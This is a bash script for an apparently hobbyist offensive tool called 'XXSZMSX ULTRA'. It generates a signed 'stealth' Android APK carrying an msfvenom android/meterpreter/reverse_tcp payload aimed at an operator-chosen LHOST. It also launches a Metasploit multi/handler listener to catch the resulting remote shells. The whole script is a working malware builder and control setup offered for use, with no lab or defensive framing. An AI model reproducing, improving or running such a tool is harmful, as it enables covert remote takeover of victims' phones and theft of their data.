#!/bin/bash
# =====================================================
# TOOL: XXSZMSX ULTRA (BLOOD EDITION v80.0)
# STATUS: PROFESSIONAL INTERFACE & DATABASE
# =====================================================

# تعريف الألوان (الدموية)
BRED='\e[1;31;1m'
RED='\e[1;31m'
NC='\e[0m'
GREY='\e[1;30m'

# مسارات النظام
SAVE_DIR="$HOME/Downloads"
DB_FILE="$HOME/.xxszmsx_db"

# دالة الشعار الاحترافي
show_banner() {
    clear
    echo -e "${BRED}"
    echo "  ██╗  ██╗██╗  ██╗ ██████╗ ███████╗"
    echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝ ╚══███╔╝"
    echo "   ╚███╔╝  ╚███╔╝ ███████╗   ███╔╝ "
    echo "   ██╔██╗  ██╔██╗ ╚════██╗  ███╔╝  "
    echo "  ██╔╝ ██╗██╔╝ ██╗███████║ ███████╗"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚══════╝"
    echo -e "${RED}       [ X X S Z M S X  U L T R A ]"
    echo -e "${GREY}  ------------------------------------"
    echo -e "${BRED}   [ SYSTEM: ACTIVE ] [ MODE: BLOOD ]"
    echo -e "${GREY}  ------------------------------------${NC}"
}

# التحقق من المتطلبات
check_deps() {
    for pkg in msfvenom apksigner keytool; do
        if ! command -v $pkg &> /dev/null; then
            echo -e "${RED}[!] Error: $pkg is missing. Installing...${NC}"
            sudo apt update && sudo apt install metasploit-framework apksig -y &> /dev/null
        fi
    done
}

# --- [ القائمة الرئيسية ] ---
main_menu() {
    while true; do
        show_banner
        echo -e "${RED}  [1]${NC} Build Stealth APK (Signed)"
        echo -e "${RED}  [2]${NC} Start Blood-Listener"
        echo -e "${RED}  [3]${NC} Database Settings"
        echo -e "${RED}  [0]${NC} Kill System"
        echo -ne "\n${BRED}  XXSZMSX >> ${NC}"
        read choice

        case $choice in
            1) build_apk ;;
            2) start_listener ;;
            3) show_db ;;
            0) exit 0 ;;
            *) echo -e "${RED}Invalid!${NC}"; sleep 1 ;;
        esac
    done
}

build_apk() {
    show_banner
    echo -e "${BRED}--- [ GENERATING STEALTH PAYLOAD ] ---${NC}"
    
    # قراءة البيانات من القاعدة لو وجدت
    if [ -f "$DB_FILE" ]; then
        source "$DB_FILE"
        echo -e "${GREY}[Info] Last IP: $LAST_IP | Port: $LAST_PORT${NC}"
    fi

    read -p "[+] App Name: " app_name
    read -p "[+] LHOST (Default: $LAST_IP): " lh; lh=${lh:-$LAST_IP}
    read -p "[+] LPORT (Default: $LAST_PORT): " lp; lp=${lp:-$LAST_PORT}
    
    # حفظ الإعدادات للمرة القادمة
    echo "LAST_IP=$lh" > "$DB_FILE"
    echo "LAST_PORT=$lp" >> "$DB_FILE"

    echo -e "${RED}[*] Injecting Shellcode...${NC}"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o "temp.apk" &> /dev/null
    
    echo -e "${RED}[*] Generating Private Keystore...${NC}"
    keytool -genkey -v -keystore mazen.keystore -alias mazen -keyalg RSA -keysize 2048 -validity 10000 -storepass blood123 -keypass blood123 -dname "CN=XX, OU=H, O=B, L=KW, S=AH, C=KW" &> /dev/null
    
    echo -e "${RED}[*] Signing with V2/V3 Schema...${NC}"
    apksigner sign --ks mazen.keystore --ks-pass pass:blood123 --out "$SAVE_DIR/$app_name.apk" temp.apk &> /dev/null
    
    rm temp.apk mazen.keystore
    echo -e "${BRED}[+] SUCCESS! BLOOD APK READY: $SAVE_DIR/$app_name.apk${NC}"
    read -p "Press Enter..."
}

start_listener() {
    show_banner
    if [ -f "$DB_FILE" ]; then source "$DB_FILE"; fi
    echo -e "${RED}[*] Initializing Control Center on $LAST_PORT...${NC}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $LAST_PORT; exploit -j"
}

check_deps
main_menu
